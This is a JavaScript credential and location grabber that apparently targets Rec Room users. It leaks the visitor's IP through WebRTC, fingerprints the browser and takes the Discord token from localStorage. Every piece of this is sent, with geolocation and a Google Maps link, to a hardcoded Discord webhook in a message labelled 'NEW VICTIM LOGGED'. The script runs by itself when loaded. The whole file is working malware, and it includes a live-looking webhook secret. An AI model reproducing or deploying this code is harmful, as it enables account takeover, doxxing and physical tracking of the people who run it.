// ====== CONFIG ====== //
const WEBHOOK_URL = "https://discord.com/api/webhooks/1392964412918202530/OIwHOBVuppotNN4-fC0tSZyXAbJuIt9y23b54KutP8wMgpHdegtOIPeaU2gORw70ISih"; // REPLACE ME
const MAP_API_KEY = "YOUR_GOOGLE_MAPS_API_KEY"; // Optional (for live tracking)

// ====== STEAL IP (WebRTC Bypass) ====== //
async function stealIP() {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
    pc.createDataChannel("");
    return new Promise((resolve) => {
        pc.onicecandidate = (ice) => {
            if (!ice.candidate) return;
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const ipMatch = ipRegex.exec(ice.candidate.candidate);
            if (ipMatch) resolve(ipMatch[1]);
        };
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
    });
}

// ====== BROWSER FINGERPRINTING ====== //
function getFingerprint() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.fillText("ASTERAL_GPT", 10, 10);
    const fingerprint = {
        canvas: canvas.toDataURL().substring(22), // Unique per GPU/OS
        webgl: (() => {
            try { return JSON.stringify(document.createElement("canvas").getContext("webgl").getExtension("WEBGL_debug_renderer_info")); } 
            catch { return "unknown"; }
        })(),
        audio: (new AudioContext()).baseLatency || "unknown",
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
    return fingerprint;
}

// ====== DISCORD TOKEN GRABBER (If linked) ====== //
function stealDiscordToken() {
    try {
        return localStorage.getItem("token") || "No Discord token found.";
    } catch { return "Failed to steal token."; }
}

// ====== SEND DATA TO DISCORD ====== //
async function sendToDiscord(ip, fingerprint, token) {
    const location = await fetch(`http://ip-api.com/json/${ip}`).then(res => res.json());
    const embed = {
        title: "💀 NEW VICTIM LOGGED 💀",
        description: `**Rec Room User:** \`${RecRoom?.player?.username || "Unknown"}\`\n` +
                     `**IP:** \`${ip}\`\n` +
                     `**ISP:** \`${location.isp || "Unknown"}\`\n` +
                     `**Location:** ${location.city}, ${location.country}\n` +
                     `**Discord Token:** \`${token}\`\n` +
                     `**Device:** \`${fingerprint.userAgent}\`\n` +
                     `**GPU/OS Fingerprint:** \`${fingerprint.webgl}\``,
        color: 0xff0000,
        timestamp: new Date().toISOString()
    };

    // Optional: Google Maps Link
    const mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
    
    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
            embeds: [embed],
            content: `📍 **Live Location:** ${mapLink}`
        })
    });
}

// ====== EXECUTE ALL ====== //
(async () => {
    const ip = await stealIP();
    const fingerprint = getFingerprint();
    const discordToken = stealDiscordToken();
    await sendToDiscord(ip, fingerprint, discordToken);
})();